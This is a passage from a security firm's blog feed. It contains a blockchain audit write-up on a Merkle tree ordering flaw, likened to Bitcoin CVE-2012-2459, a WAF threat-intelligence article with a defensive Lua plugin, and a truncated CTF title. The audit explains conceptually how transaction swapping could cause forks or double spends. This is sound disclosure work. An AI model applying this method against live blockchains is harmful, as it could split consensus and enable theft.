漏洞，结合常见业务场景，分析代码的实现。&lt;b&gt;区块链公链项目，其本身代码量较多，在项目背后，还有严谨的金融货币模型以及共识模型，且无较为实用的审计工具，需要更多以来人工审计，审计的定制化程度高，难度及工作量大。依我理解，我们主要从以下方向入手：&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;语言特性及其已知漏洞&lt;br&gt;底层实现【密码学、序列化、大数运算等】&lt;br&gt;区块链基本元素的实现【区块、交易、链】&lt;br&gt;区块链行为的逻辑【生成一个区块、交易进入 tx_pool 等】&lt;br&gt;区块链的其他组件【p2p、rpc、钱包等】&lt;br&gt;共识算法合理性&lt;br&gt;金融模型合理性&lt;br&gt;历史公链漏洞&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞发现过程&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们在审计过程中发现的漏洞利用方式，源于该公链项目在实现 Merkle Tree 逻辑时，与常规实现方式有些许不同。在整理之前比特币区块链、以太坊区块链，出现过的漏洞时，发现了可能利用的漏洞点，经过确认发现可以影响不同节点间达成共识，进而造成分叉。&lt;/p&gt;&lt;p&gt;&lt;b&gt;在发现问题后，长亭科技立刻汇报给公链项目方，公链开发者响应迅速，非常重视此次安全问题，即刻完成了修复。&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;什么是 Merkle Tree&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Merkle Tree，一般也称为 Merkle Hash Tree。是数据结构中我们所了解的树，其各个节点均包含 Hash 值。&lt;/p&gt;&lt;p&gt;&lt;b&gt;Merkle Tree 具有以下的特点：&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;它是一棵树，具有数据结构中，树结构的所有特点。【在讲解中我们默认其为二叉树】&lt;/li&gt;&lt;li&gt;Merkle Tree 的叶子节点中存放数据。非叶子节点的 value，是由其左右两子节点，经过组合和 Hash 运算获得。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;让我们举个例子来表示：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-83202c519637271c10b9d061a6b8ce08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic1.zhimg.com/v2-83202c519637271c10b9d061a6b8ce08_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-83202c519637271c10b9d061a6b8ce08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic1.zhimg.com/v2-83202c519637271c10b9d061a6b8ce08_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-83202c519637271c10b9d061a6b8ce08_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;我们可以看到，只有叶子节点中存放了 Data【Tx Hash】，而其上面每一个非叶子节点的 value，都是他们孩子的 value，经过组合和哈希运算得到的。&lt;/p&gt;&lt;p&gt;Merkle Tree 被广泛应用于对比以及验证处理。&lt;b&gt;在区块链技术中，Merkle Tree 被用于验证各区块中的交易，在传输过程中是否被篡改。&lt;/b&gt;因为我们可以看到，倘若修改任一叶子节点的内容，这棵 Merkle Tree 的 root 节点的值【Merkle 根】就会随之改变，可以通过判断 Merkle 根来得知，该区块中，有交易可能传输出错或被恶意篡改。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e18f671e9b07b13a615eb4bfd7efd1e7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-e18f671e9b07b13a615eb4bfd7efd1e7_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e18f671e9b07b13a615eb4bfd7efd1e7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-e18f671e9b07b13a615eb4bfd7efd1e7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-e18f671e9b07b13a615eb4bfd7efd1e7_b.jpg&quot;&gt;&lt;/figure&gt;&lt;h2&gt;&lt;b&gt;审计中发现的实现方式&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;核心代码【有修改】：&lt;br&gt;&lt;/p&gt;&lt;p&gt;# 外层为循环，以建立Merkle Tree&lt;/p&gt;&lt;p&gt;if hashList[i+1] == None :&lt;/p&gt;&lt;p&gt;    hashList[p] = sha3(hashList[i]+hashList[i])&lt;/p&gt;&lt;p&gt;else :&lt;/p&gt;&lt;p&gt;  if hashList[i] &amp;gt; hashList[i+1] :&lt;/p&gt;&lt;p&gt;        hashList[p] = sha3(hashList[i]+hashList[i+1])&lt;/p&gt;&lt;p&gt;  else:&lt;/p&gt;&lt;p&gt;        hashList[p] = sha3(hashList[i+1]+hashList[i])&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在审计过程中，当考察到 Merkle Tree 底层实现方式时，发现其实现有一定违和感，具体如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;先根据 tx_hash 数量，建立一棵完全二叉树&lt;/li&gt;&lt;li&gt;将 tx_hash，按顺序放至叶子节点中&lt;/li&gt;&lt;li&gt;通过以下算法算得上层节点的 Hash 值：&lt;/li&gt;&lt;ol&gt;&lt;li&gt;对于某一非叶子节点，将其两孩子的 value 进行比较，&lt;b&gt;序列大者靠前&lt;/b&gt;&lt;/li&gt;&lt;li&gt;将排好的两孩子，进行Hash运算，得到的 Hash 值为该节点的 value&lt;/li&gt;&lt;/ol&gt;&lt;li&gt;如此往复，建立 Merkle Tree，算得根节点的 value&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;b&gt;举例说明：&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6f7bfce653946b214480f74ce1c68f56_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;519&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-6f7bfce653946b214480f74ce1c68f56_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6f7bfce653946b214480f74ce1c68f56_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;519&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-6f7bfce653946b214480f74ce1c68f56_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-6f7bfce653946b214480f74ce1c68f56_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;初看此处时，觉得实现 Merkle Tree 的方式有些奇怪，进行了一次两孩子的 value 比较，但想到 Merkle Tree 的主要意义在于校验，防止篡改。实现方式略有不同可能影响不大，遂只做了记录。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Bitcoin 漏洞CVE-2012-2459&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在整理曾经出现的公链漏洞时，发现了这样一个有名的比特币 DoS 漏洞。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0b948b04d9f067e633fce750dbb79d03_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;354&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-0b948b04d9f067e633fce750dbb79d03_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0b948b04d9f067e633fce750dbb79d03_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;354&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-0b948b04d9f067e633fce750dbb79d03_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-0b948b04d9f067e633fce750dbb79d03_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;通过了 Merkle Root 的根认证的区块，但其实并不合法。可能导致区块链分叉，或是进行双花攻击等，危害性较高，攻击方式较为简单，我们来分析该漏洞成因。&lt;/p&gt;&lt;p&gt;在旧版本的 Bitcoin 客户端中，其实现 Merkle Tree 的建立【计算该区块交易的 Merkle 根】的过程和通常的方式没有太大区别，当区块中交易个数为奇数时，会进行一个这样的操作：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d82d17eb5df21b113137c0f7a69ad371_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic2.zhimg.com/v2-d82d17eb5df21b113137c0f7a69ad371_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d82d17eb5df21b113137c0f7a69ad371_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic2.zhimg.com/v2-d82d17eb5df21b113137c0f7a69ad371_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-d82d17eb5df21b113137c0f7a69ad371_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;在计算 Merkle 根时，若其叶子节点的个数为奇数个，则复制最后一笔交易的 Hash 值，参与建立 Merkle Tree【并不是复制一笔交易出来，不能有重复的交易】。&lt;/p&gt;&lt;p&gt;看上去没有什么太大的问题，只是计算 Merkle 根时，对边界的处理。但 CVE-2012-2459 漏洞，利用的就是这一个特性。&lt;/p&gt;&lt;p&gt;&lt;b&gt;区块A：&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-73cf9bedcc46ccff5dbc3459d28a781d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;568&quot; data-rawheight=&quot;238&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;568&quot; data-original=&quot;https://pic2.zhimg.com/v2-73cf9bedcc46ccff5dbc3459d28a781d_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-73cf9bedcc46ccff5dbc3459d28a781d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;568&quot; data-rawheight=&quot;238&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;568&quot; data-original=&quot;https://pic2.zhimg.com/v2-73cf9bedcc46ccff5dbc3459d28a781d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-73cf9bedcc46ccff5dbc3459d28a781d_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;攻击者首先选择一个有奇数笔交易的区块，构造区块时，将最后一笔交易复制一份，加入该区块中。&lt;/p&gt;&lt;p&gt;&lt;b&gt;区块B:&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5d4dae1f039cdd88a958f386286a3fe1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;568&quot; data-rawheight=&quot;297&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;568&quot; data-original=&quot;https://pic2.zhimg.com/v2-5d4dae1f039cdd88a958f386286a3fe1_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5d4dae1f039cdd88a958f386286a3fe1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;568&quot; data-rawheight=&quot;297&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;568&quot; data-original=&quot;https://pic2.zhimg.com/v2-5d4dae1f039cdd88a958f386286a3fe1_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-5d4dae1f039cdd88a958f386286a3fe1_b.jpg&quot;&gt;&lt;/figure&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9711d698a37a11934161755d786d319e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;506&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-9711d698a37a11934161755d786d319e_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9711d698a37a11934161755d786d319e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;506&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-9711d698a37a11934161755d786d319e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-9711d698a37a11934161755d786d319e_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;区块A是一个正常的区块，区块B是拥有重复交易的区块。在共识过程中，会因为 tx_3 和 tx_2 一致，而造成出错并抛弃。但这两个区块根据上面的描述，对应的 Merkle 根是一致的。对应的区块头也是一致的。&lt;/p&gt;&lt;p&gt;&lt;b&gt;攻击者可以构造同样的区块头，在传播广播区块时，广播不同交易列表的区块信息，导致网络中接收到原区块的节点认为此区块有效，接收到恶意区块的节点认为此区块无效，造成不同节点面对这一区块不能达到共识，进而使区块链分叉，或是进行双花攻击等，危害极大。&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞利用方式&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;回到我们的审计过程中，类似上面的例子，思考在此项目中是否也会有类似的攻击手法。&lt;/p&gt;&lt;p&gt;我们发现，对于任意两笔相邻的交易，我们可以调换他们的位置，来使 Merkle 根不变，更有甚者，我们可以交换任意一个节点下，两个孩子为根的树的位置，也不会改变 Merkle 根的值。&lt;/p&gt;&lt;p&gt;&lt;b&gt;经过对于其他部分对区块和交易的校验分析之后，我们发现可以通过构造两笔特定的交易，造成和上面比特币区块链类似的攻击效果。&lt;/b&gt;经过攻击链的设计和验证后，验证了此方法的可能性。此公链在运行过程中，有可能因此漏洞，被进行强制分叉或是双花攻击等。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;汇报该漏洞后，公链项目方十分重视这一问题，响应迅速，立刻修复了该实现问题。&lt;/p&gt;&lt;p&gt;在审计该项目的一些底层实现过程中，我们审计到这个较为经典的漏洞，并根据此漏洞，构造了一条完整的攻击链，达到了对公链强制分叉的影响。这也提醒了我们： &lt;b&gt;代码千万行，安全第一行。实现不规范，首席两行泪。&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-fc05b37019760c9652d86299a7047340_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;73&quot; data-rawheight=&quot;72&quot; class=&quot;content_image&quot; width=&quot;73&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-fc05b37019760c9652d86299a7047340_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;73&quot; data-rawheight=&quot;72&quot; class=&quot;content_image lazy&quot; width=&quot;73&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-fc05b37019760c9652d86299a7047340_b.png&quot;&gt;&lt;/figure&gt;&lt;p&gt;对于已证明安全的密码学方案或技术方案，若实现不规范，亦有可能成为漏洞，造成严重后果。&lt;/p&gt;&lt;p&gt;长亭科技区块链安全组，在区块链安全技术方面已有相当的积累，拥有多个区块链相关的漏洞 CVE 编号，曾进行过大量的公链审计、智能合约审计项目，提供诸多企业级服务，为众多优秀的公链社区提供了建设性的意见。&lt;/p&gt;&lt;hr&gt;&lt;blockquote&gt;&lt;b&gt;长亭科技安全服务&lt;/b&gt;&lt;br&gt;&lt;b&gt;7*24小时守护您的安全！&lt;/b&gt;&lt;br&gt;&lt;b&gt;邮箱：support@chaitin.com&lt;/b&gt;&lt;br&gt;&lt;b&gt;应急响应热线：4000-327-707&lt;/b&gt;&lt;/blockquote&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-03-22-60064645</guid>
<pubDate>Fri, 22 Mar 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>下一代WAF场景化实践漫谈系列——威胁情报联动的价值</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-03-18-59570288.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/59570288&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b57e04ac8313cdcee878f8e7967ccc78_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;开篇之初，我们先来看一个真实的案例，发生在&lt;b&gt;雷池（SafeLine）下一代Web应用防火墙&lt;/b&gt;客户的使用场景中。&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt; 客户需求 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;金融某客户，其敏感业务的统一认证接口长期遭受&lt;b&gt;爆破和撞库&lt;/b&gt;的威胁，希望WAF能够同步处理威胁情报服务产生的业务情报信息，两者联动保障业务正常稳定运行。&lt;/p&gt;&lt;h2&gt;&lt;b&gt; 挑战 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;1. 接口访问量巨大&lt;/p&gt;&lt;p&gt;2. 不能出现业务延迟&lt;/p&gt;&lt;p&gt;3. 尽量避免人工参与造成的错误&lt;/p&gt;&lt;h2&gt;&lt;b&gt; 解决方案 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;第一步，雷池（SafeLine）通过独有的插件平台完成&lt;b&gt;插件配置&lt;/b&gt;，对访问该统一认证接口的用户进行&lt;b&gt;指纹提取&lt;/b&gt;——指定筛选条件的方式过滤出符合某种特征的用户指纹（如源 IP、域名、URL 等）的 HTTP 请求； &lt;/p&gt;&lt;p&gt;第二步，信息传递由威胁情报服务进行&lt;b&gt;风险评估&lt;/b&gt;，若威胁情报平台认为当前用户具有恶意，将回传当前的威胁信息及建议；&lt;/p&gt;&lt;p&gt;第三步，雷池（SafeLine）&lt;b&gt;接收威胁信息&lt;/b&gt;，对相关请求进行逐条处理，并将执行手段下发给请求检测处理模块，进行&lt;b&gt;立即阻断或限制&lt;/b&gt;该用户的后续访问行为，&lt;b&gt;保障业务的正常运行。&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3c7f0eabccd3f81272b02a94b0b596be_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1045&quot; data-rawheight=&quot;642&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1045&quot; data-original=&quot;https://pic3.zhimg.com/v2-3c7f0eabccd3f81272b02a94b0b596be_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3c7f0eabccd3f81272b02a94b0b596be_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1045&quot; data-rawheight=&quot;642&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1045&quot; data-original=&quot;https://pic3.zhimg.com/v2-3c7f0eabccd3f81272b02a94b0b596be_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-3c7f0eabccd3f81272b02a94b0b596be_b.jpg&quot;&gt;&lt;/figure&gt;&lt;h2&gt;&lt;b&gt; 客户反馈 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;进行了多轮测试验证后，企业对雷池（SafeLine）和威胁情报服务联动的可用性和准确性很满意，在处理的时效方面完全超出预期，&lt;b&gt;大大降低了安全业务的人工维护成本和时间成本，并有效降低了敏感业务的安全风险。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;云时代的WAF，早已不是你当年认识的那个WAF了。&lt;b&gt;平台属性增强，规则属性减弱，智能、灵活成为一款简单好用WAF的首要考虑因素。&lt;/b&gt;雷池（SafeLine）下一代Web应用防火墙，作为新型WAF的代表作品，在越来越多的客户真实使用场景中被玩出了花样，解决了更多贴合业务场景和安全风险的问题。&lt;br&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-799944c46700e3a6618841e80275accd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;681&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1080&quot; data-original=&quot;https://pic2.zhimg.com/v2-799944c46700e3a6618841e80275accd_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-799944c46700e3a6618841e80275accd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;681&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1080&quot; data-original=&quot;https://pic2.zhimg.com/v2-799944c46700e3a6618841e80275accd_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-799944c46700e3a6618841e80275accd_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;本文着笔的WAF和威胁情报联动的想象空间在于：WAF根据自身的防护能力以及网络边界位置的独特性，检测到更多的未知威胁，更贴近业务场景，更精准、实时的阻断威胁从而降低业务风险。&lt;b&gt;威胁情报犹如为WAF带来新的武器库，可以应对更多类型的网络威胁。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;长亭科技的雷池（SafeLine）作为15后产品代表，从设计之初就对开放性与扩展性给予了非常高的重视，为用户提供了&lt;b&gt;全开放式的 API 接口和功能丰富可高度自定义的扩展插件接口，&lt;/b&gt;使其能灵活的与各类平台和安全产品进行联动，例如风控平台、运维平台、蜜罐、扫描器以及威胁情报产品等。&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;参考阅读&lt;/b&gt;&lt;/blockquote&gt;&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzIwNDA2NDk5OQ%3D%3D%26mid%3D2651372367%26idx%3D1%26sn%3Dd3da91ffc9b459ae6cbb9db7e8dc98cd%26chksm%3D8d39cac7ba4e43d1b92148a11187b4cdb502da0c476ef205683d71e8a6dd9d379647d795b105%26scene%3D21%23wechat_redirect&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;https://pic3.zhimg.com/v2-2d9ceed78978badf52f685b50ced44c6_ipico.jpg&quot; data-image-width=&quot;358&quot; data-image-height=&quot;358&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;2019年，你的 WAF 能应对场景化安全风险了吗？&lt;/a&gt;&lt;p&gt;除了&lt;b&gt;API集成方式&lt;/b&gt;，雷池（SafeLine）内置的&lt;b&gt;插件平台&lt;/b&gt;为高级玩家提供了”任意模式“，如与威胁情报的联动：在插件平台使用 Lua 作为脚本语言，用户自主编写插件来输出场景化的 Web 访问统计与 Web 攻击统计；或者编写插件，与其他安全产品及风控系统整和，对攻击者进行多维度深度检测与阻断。 &lt;/p&gt;&lt;p&gt;这种操作的&lt;b&gt;价值&lt;/b&gt;在于：&lt;/p&gt;&lt;p&gt;1. 不影响企业的正常业务&lt;/p&gt;&lt;p&gt;2. &lt;b&gt;超大流量&lt;/b&gt;下具备稳定的处理性能&lt;/p&gt;&lt;p&gt;3. &lt;b&gt;响应迅速，&lt;/b&gt;延迟处理时长缩短至毫秒级&lt;/p&gt;&lt;p&gt;4. &lt;b&gt;自动化程度高，&lt;/b&gt;只需要正确编写插件&lt;/p&gt;&lt;p&gt;5. 处理&lt;b&gt;准确率高&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;附上阅读全文小彩蛋&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;文中提到最佳实践的&lt;b&gt;插件编写思路：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;使用 &lt;b&gt;match 变量&lt;/b&gt;进行筛选，过滤所有访问统一认证接口的 HTTP 请求；&lt;/p&gt;&lt;p&gt;注册一个&lt;b&gt;回调函数&lt;/b&gt;，当用户访问统一认证接口时，将 HTTP 请求传入回调函数进行处理；&lt;/p&gt;&lt;p&gt;与威胁情报平台联动，判断访问者是否有&lt;b&gt;攻击背景&lt;/b&gt;；&lt;/p&gt;&lt;p&gt;发现恶意用户后下发规则，阻断该用户的&lt;b&gt;后续访问&lt;/b&gt;。&lt;/p&gt;&lt;h2&gt;&lt;b&gt; 样例插件代码结构 &lt;/b&gt;&lt;/h2&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;local safeline = require &quot;safeline&quot;

header = {}
header[&quot;User-Agent&quot;] = &quot;safeline&quot;

bantime = 60

-- 威胁情报服务平台地址
url = &quot;http://xx.xx.xx.xx/query?apiKey=xxxxxxxxxxxxxxx&amp;amp;src=%s&quot;

match = {
    ip = &quot;0.0.0.0/0&quot;,
    host    = &quot;www.chaitin.cn&quot;,
    urlpath = &quot;/safelinenb&quot;,
    type = safeline.MATCH_TYPE_ALL,
}
function action(ip, resp)
  local banip = {
      ip = ip,
  }
  if string.find(resp, &quot;badboy&quot;) ~= nil then
    safeline.action_ban(banip, bantime)
  end
end

function process(ip, host, urlpath)
    urltmp = string.format(url, ip)
        resp, err = safeline.http_get(urltmp, header)
    action(ip, resp[&quot;body&quot;])
end

safeline.register(safeline.TYPE_PROCESS, match, process)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;下一代WAF和威胁情报，一个老树新花，一个近年热词，有意思的互动解决了&lt;b&gt;新场景下的网络安全问题&lt;/b&gt;，才是当今安全产品不断创新的意义所在。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;更多插件以及 API 信息欢迎前往&lt;/p&gt;&lt;p&gt;&lt;b&gt;[长亭 SafeLine 开放平台] &lt;/b&gt;&lt;/p&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//github.com/chaitin/safeline-open-platform&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; data-image=&quot;https://pic4.zhimg.com/v2-b465088480504bd3c39bb2ae028690f7_ipico.jpg&quot; data-image-width=&quot;400&quot; data-image-height=&quot;400&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;chaitin/safeline-open-platform&lt;/a&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-03-18-59570288</guid>
<pubDate>Mon, 18 Mar 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>48小时逃逸Virtualbox虚拟机——记一次CTF中的0day之旅</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-03-11-58910752.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/58910752&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
